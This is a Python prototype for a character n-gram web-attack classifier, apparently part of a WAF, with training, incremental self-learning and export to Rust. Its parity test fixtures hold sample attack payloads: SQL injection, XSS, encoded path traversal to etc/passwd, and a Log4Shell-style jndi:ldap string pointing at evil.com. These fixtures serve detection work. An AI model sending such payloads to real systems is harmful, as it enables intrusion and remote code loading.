#!/usr/bin/env python3
"""字符级 n-gram Web 攻击分类器原型(纯 numpy)。

设计目标:轻量、CPU、可增量叠加训练,且模型形态(hashing + 线性权重)
便于日后移植到 Rust 内联推理,无需 ONNX runtime。

核心选型:
- 特征:HashingVectorizer 思路。对 path+query+body(URL 单遍解码后)取
  字符 n-gram(n=2..4),用 crc32 确定性哈希到固定维度 D。固定特征空间是
  "叠加训练"的前提——新数据里的新 n-gram 不会撑破/错位特征维度。
- 模型:online 逻辑回归(SGD, log loss, L2 正则)。模型状态仅 (w, b),
  存盘后可重新加载继续 partial_fit,天然支持增量/叠加训练。
- 类不平衡:黑样本远少于白样本,给正类按 n_neg/n_pos 加权,避免被淹没。

刻意排除 Host / 客户端 IP / User-Agent 作为特征:BlazeHTTP 黑样本多打同一
靶机,把这些放进特征会让模型学到"目标=某IP 即攻击"的数据集 artifact(泄漏),
而非真实 payload 信号。

用法:
  train       <样本目录> --model m.npz    # 首次训练(在训练集上)
  update      <样本目录> --model m.npz    # 叠加训练(partial_fit 到已存模型)
  update-gaps <gaps.jsonl> --model m.npz  # 自学习:从 WAF 缺口样本叠加训练(见下)
  eval        <样本目录> --model m.npz    # 在测试集上评估
  export      --model m.npz               # 导出 model.bin + parity.json 供 Rust
  demo        <样本目录>                   # 一键演示:切分→训练A→叠加B→对比

自学习闭环(update-gaps):把线上"规则漏判、被 ngram/LLM 抓到"的缺口样本
(gaps.jsonl)作为正样本叠加训练,同时**重新采样一批可信白样本作负样本重锚**——
这是防反馈投毒的关键:只学新的攻击检测,但始终用静态可信白样本守住误报边界,
不让模型被"看着正常"的流量带偏。
"""
import sys, os, zlib, json, argparse
import numpy as np

D_BITS = 18
D = 1 << D_BITS          # 特征维度 262144
NGRAM_MIN, NGRAM_MAX = 2, 4
SEED = 42


# ---------- 样本解析与特征提取 ----------

def _split_head_body(raw: bytes):
    for sep in (b"\r\n\r\n", b"\n\n"):
        i = raw.find(sep)
        if i >= 0:
            return raw[:i], raw[i + len(sep):]
    return raw, b""


def _percent_decode_once(s: str) -> str:
    out, i, n = [], 0, len(s)
    while i < n:
        c = s[i]
        if c == "%" and i + 2 < n:
            try:
                out.append(chr(int(s[i+1:i+3], 16))); i += 3; continue
            except ValueError:
                pass
        out.append(" " if c == "+" else c); i += 1
    return "".join(out)


def feature_text_from_parts(method: str, path: str, query: str, body_txt: str) -> str:
    """特征文本拼接(parity 基准):method+path+query+body → 原文 + 单遍解码,小写。
    Rust 侧必须逐位镜像本函数。"""
    body_txt = body_txt[:4096]
    raw_text = f"{method} {path} {query} {body_txt}"
    decoded = _percent_decode_once(raw_text)
    return (raw_text + " " + decoded).lower()


def extract_text(raw: bytes) -> str:
    """从原始 HTTP 请求提取分类特征文本:method + path + query + body,
    URL 单遍解码,小写。刻意不含 Host/IP/UA。"""
    head, body = _split_head_body(raw)
    lines = head.split(b"\n")
    reqline = lines[0].decode("utf-8", "replace").strip()
    parts = reqline.split()
    method = parts[0] if parts else ""
    target = parts[1] if len(parts) > 1 else ""
    if "?" in target:
        path, query = target.split("?", 1)
    else:
        path, query = target, ""
    body_txt = body[:4096].decode("utf-8", "replace")
    return feature_text_from_parts(method, path, query, body_txt)


def hash_features(text: str) -> dict:
    """字符 n-gram → {特征索引: 计数}。crc32 确定性哈希。"""
    feats = {}
    t = text
    L = len(t)
    for n in range(NGRAM_MIN, NGRAM_MAX + 1):
        for i in range(L - n + 1):
            g = t[i:i+n]
            idx = zlib.crc32(g.encode("utf-8", "replace")) & (D - 1)
            feats[idx] = feats.get(idx, 0) + 1
    # L2 归一化,弱化长请求的量纲优势
    norm = np.sqrt(sum(v*v for v in feats.values())) or 1.0
    return {k: v / norm for k, v in feats.items()}


# ---------- 数据加载 ----------

def load_samples(root: str):
    """返回 [(feats_dict, label)],label 1=black 0=white。"""
    data = []
    for dirpath, _, files in os.walk(root):
        for f in files:
            if f.endswith(".black"):
                label = 1
            elif f.endswith(".white"):
                label = 0
            else:
                continue
            p = os.path.join(dirpath, f)
            with open(p, "rb") as fh:
                raw = fh.read()
            data.append((hash_features(extract_text(raw)), label))
    return data


def stratified_split(data, test_frac=0.3, seed=SEED):
    rng = np.random.default_rng(seed)
    blacks = [d for d in data if d[1] == 1]
    whites = [d for d in data if d[1] == 0]
    def split(xs):
        idx = rng.permutation(len(xs))
        cut = int(len(xs) * (1 - test_frac))
        tr = [xs[i] for i in idx[:cut]]
        te = [xs[i] for i in idx[cut:]]
        return tr, te
    b_tr, b_te = split(blacks)
    w_tr, w_te = split(whites)
    return b_tr + w_tr, b_te + w_te


# ---------- 模型:online 逻辑回归 ----------

class Model:
    def __init__(self):
        self.w = np.zeros(D, dtype=np.float32)
        self.b = 0.0
        self.seen = 0          # 累计训练样本数(跨 update 累加,体现叠加)
        self.updates = 0       # 训练轮次调用数

    @staticmethod
    def load(path):
        m = Model()
        z = np.load(path, allow_pickle=False)
        m.w = z["w"]; m.b = float(z["b"]); m.seen = int(z["seen"]); m.updates = int(z["updates"])
        return m

    def save(self, path):
        np.savez(path, w=self.w, b=np.float32(self.b),
                 seen=np.int64(self.seen), updates=np.int64(self.updates))

    def score(self, feats: dict) -> float:
        s = self.b + sum(self.w[i] * v for i, v in feats.items())
        return 1.0 / (1.0 + np.exp(-s))

    def partial_fit(self, batch, epochs=5, lr=0.5, l2=1e-6, seed=SEED):
        """SGD 增量训练。可对已训练模型继续调用 → 叠加训练。"""
        rng = np.random.default_rng(seed + self.updates)  # 每次 update 换序
        n_pos = sum(1 for _, y in batch if y == 1)
        n_neg = len(batch) - n_pos
        # 类平衡权重:正类稀少,放大其梯度
        w_pos = (n_neg / max(n_pos, 1))
        for ep in range(epochs):
            order = rng.permutation(len(batch))
            for j in order:
                feats, y = batch[j]
                p = self.score(feats)
                sw = w_pos if y == 1 else 1.0
                g = (p - y) * sw           # log loss 梯度
                self.b -= lr * g
                for i, v in feats.items():
                    self.w[i] -= lr * (g * v + l2 * self.w[i])
        self.seen += len(batch)
        self.updates += 1


# ---------- 评估 ----------

def evaluate(model, test, thresholds=(0.5, 0.7, 0.9)):
    ys = np.array([y for _, y in test])
    ps = np.array([model.score(f) for f, _ in test])
    nb = int((ys == 1).sum()); nw = int((ys == 0).sum())
    rows = []
    for th in thresholds:
        pred = ps >= th
        tp = int((pred & (ys == 1)).sum())
        fp = int((pred & (ys == 0)).sum())
        recall = tp / nb * 100 if nb else 0.0
        fpr = fp / nw * 100 if nw else 0.0
        prec = tp / (tp + fp) * 100 if (tp + fp) else 0.0
        f1 = (2 * tp / (2 * tp + fp + (nb - tp))) if nb else 0.0
        rows.append((th, recall, fpr, prec, f1, tp, fp))
    return nb, nw, rows


def print_eval(tag, nb, nw, rows):
    print(f"[{tag}] 测试集 黑={nb} 白={nw}")
    print("  阈值    检出率    误报率    精确率     F1     (TP/FP)")
    for th, recall, fpr, prec, f1, tp, fp in rows:
        print(f"  {th:.2f}   {recall:6.2f}%  {fpr:6.3f}%  {prec:6.2f}%  {f1:.3f}   ({tp}/{fp})")


# ---------- 命令 ----------

def cmd_demo(root):
    print("加载样本 ...", flush=True)
    data = load_samples(root)
    nb = sum(1 for _, y in data if y == 1)
    print(f"共 {len(data)} 条(黑 {nb} / 白 {len(data)-nb})")
    train, test = stratified_split(data)
    # 训练集再对半分,演示叠加训练
    rng = np.random.default_rng(SEED)
    idx = rng.permutation(len(train))
    half = len(idx) // 2
    batch_a = [train[i] for i in idx[:half]]
    batch_b = [train[i] for i in idx[half:]]

    m = Model()
    print("\n>>> 第一次训练(仅 batch A)")
    m.partial_fit(batch_a, epochs=5)
    nbt, nwt, rows = evaluate(m, test)
    print_eval(f"训练A 后  seen={m.seen}", nbt, nwt, rows)

    print("\n>>> 叠加训练(partial_fit batch B 到同一模型)")
    m.partial_fit(batch_b, epochs=5)
    nbt, nwt, rows = evaluate(m, test)
    print_eval(f"叠加B 后  seen={m.seen}", nbt, nwt, rows)

    mpath = os.path.join(os.path.dirname(__file__), "model.npz")
    m.save(mpath)
    print(f"\n模型已存 {mpath}(seen={m.seen}, updates={m.updates})")
    # 验证存盘→加载→可继续叠加
    m2 = Model.load(mpath)
    print(f"重新加载校验:seen={m2.seen} updates={m2.updates} —— 可继续 update 叠加")


def cmd_train(root, model_path, update=False):
    data = load_samples(root)
    m = Model.load(model_path) if update and os.path.exists(model_path) else Model()
    mode = "叠加训练" if update else "训练"
    m.partial_fit(data, epochs=5)
    m.save(model_path)
    print(f"{mode}完成:本批 {len(data)} 条,累计 seen={m.seen}, updates={m.updates} → {model_path}")


def cmd_eval(root, model_path):
    m = Model.load(model_path)
    data = load_samples(root)
    nb, nw, rows = evaluate(m, data)
    print_eval(f"model seen={m.seen}", nb, nw, rows)


def cmd_export(model_path):
    """把 npz 模型导出为 Rust 易读的二进制 + parity 黄金样本。

    model.bin 布局(全小端):
      magic  u32 = 0x4E47524D ("NGRM")
      D      u32
      nmin   u32
      nmax   u32
      bias   f32
      w[D]   f32
    """
    import struct, json
    m = Model.load(model_path)
    outdir = os.path.dirname(model_path) or "."
    binpath = os.path.join(outdir, "model.bin")
    with open(binpath, "wb") as f:
        f.write(struct.pack("<IIII", 0x4E47524D, D, NGRAM_MIN, NGRAM_MAX))
        f.write(struct.pack("<f", float(m.b)))
        f.write(m.w.astype("<f4").tobytes())
    print(f"导出 {binpath}(D={D}, bias={m.b:.6f}, {os.path.getsize(binpath)} 字节)")

    # parity 黄金样本:(method,path,query,body) → 期望 feature_text + score。
    # Rust 做完整端到端:拼接→单遍解码→小写→crc32 哈希→L2→sigmoid,逐条对齐。
    # 覆盖:SQLi、XSS、路径穿越(编码)、hex 转义混淆、中文、+ 号、jndi、正常流量。
    cases = [
        ("GET", "/items", "q=1 union select name from t", ""),
        ("GET", "/search", "name=<script>alert(1)</script>", ""),
        ("GET", "/a", "x=%2e%2e%2f%2e%2e%2fetc/passwd", ""),
        ("POST", "/login", "", "user=admin&pass=1' or '1'='1"),
        ("GET", "/p", "id=42&sort=price", ""),
        ("GET", "/vulnerabilities/xss_r/", "name=parent[%27%5cx65%5cx76%5cx61%5cx6c%27]", ""),
        ("GET", "/ref", "q=union+select+关键字", ""),
        ("GET", "/", "x=${jndi:ldap://evil.com/a}", ""),
    ]
    golden = []
    for method, path, query, body in cases:
        ft = feature_text_from_parts(method, path, query, body)
        feats = hash_features(ft)
        golden.append({
            "method": method, "path": path, "query": query, "body": body,
            "feature_text": ft, "score": float(m.score(feats)),
        })
    ppath = os.path.join(outdir, "parity.json")
    with open(ppath, "w") as f:
        json.dump(golden, f, ensure_ascii=False, indent=2)
    print(f"导出 {ppath}({len(golden)} 条黄金样本,Rust parity 测试用)")


def cmd_update_gaps(gaps_path, model_path, whites_dir, n_neg):
    """自学习增量:从 WAF 缺口样本(JSONL 正样本)+ 重锚白样本(负样本)叠加训练。

    gaps.jsonl 每行含 method/path/query/body(规则漏判、被更高级别判恶意的攻击)。
    这些作正样本;再从可信白样本目录随机采 n_neg 条作负样本重锚,守住误报边界。
    """
    if not os.path.exists(model_path):
        print(f"错误: 模型 {model_path} 不存在,请先 train"); return

    # 正样本:缺口 payload
    pos = []
    with open(gaps_path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                r = json.loads(line)
            except json.JSONDecodeError:
                continue
            ft = feature_text_from_parts(r.get("method", ""), r.get("path", ""),
                                         r.get("query", ""), r.get("body", ""))
            pos.append((hash_features(ft), 1))
    if not pos:
        print(f"错误: {gaps_path} 无可用缺口样本"); return

    # 负样本:白样本重锚(防投毒:始终用可信 benign 校准 FP 边界)
    neg = []
    if whites_dir and os.path.isdir(whites_dir):
        white_files = []
        for dp, _, fs in os.walk(whites_dir):
            white_files += [os.path.join(dp, x) for x in fs if x.endswith(".white")]
        rng = np.random.default_rng(SEED)
        if white_files:
            pick = rng.choice(len(white_files), size=min(n_neg, len(white_files)), replace=False)
            for i in pick:
                with open(white_files[i], "rb") as fh:
                    neg.append((hash_features(extract_text(fh.read())), 0))

    m = Model.load(model_path)
    before = m.seen
    batch = pos + neg
    print(f"叠加训练: 缺口正样本 {len(pos)} + 白样本重锚 {len(neg)} = {len(batch)} 条")
    m.partial_fit(batch, epochs=5)
    m.save(model_path)
    print(f"完成: seen {before} → {m.seen}, updates={m.updates} → {model_path}")
    print("提示: 重新 `export` 生成 model.bin/parity.json,并跑 cargo test(parity)+ eval 验证。")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("cmd", choices=["train", "update", "update-gaps", "eval", "demo", "export"])
    ap.add_argument("root", nargs="?", default="")
    ap.add_argument("--model", default=os.path.join(os.path.dirname(__file__), "model.npz"))
    ap.add_argument("--whites", default="testdata/blazehttp", help="update-gaps 的白样本重锚目录")
    ap.add_argument("--neg", type=int, default=2000, help="update-gaps 重锚的白样本条数")
    a = ap.parse_args()
    if a.cmd == "demo":
        cmd_demo(a.root)
    elif a.cmd == "train":
        cmd_train(a.root, a.model, update=False)
    elif a.cmd == "update":
        cmd_train(a.root, a.model, update=True)
    elif a.cmd == "update-gaps":
        cmd_update_gaps(a.root or "gaps.jsonl", a.model, a.whites, a.neg)
    elif a.cmd == "eval":
        cmd_eval(a.root, a.model)
    elif a.cmd == "export":
        cmd_export(a.model)


if __name__ == "__main__":
    main()
